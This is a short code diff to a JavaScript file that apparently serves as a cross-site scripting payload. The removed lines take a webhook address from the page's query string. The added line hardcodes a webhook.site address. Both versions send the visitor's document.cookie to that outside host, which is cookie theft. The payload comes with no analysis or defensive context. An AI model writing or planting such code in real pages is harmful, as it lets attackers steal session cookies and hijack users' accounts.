@@ -1,3 +1,1 @@
-const urlParams = new URLSearchParams(window.location.search);
-const webhook = urlParams.get('webhook');
-fetch(webhook+document.cookie);
+fetch('https://webhook.site/325fdb48-3900-4781-b01f-fb1157916021'+document.cookie);
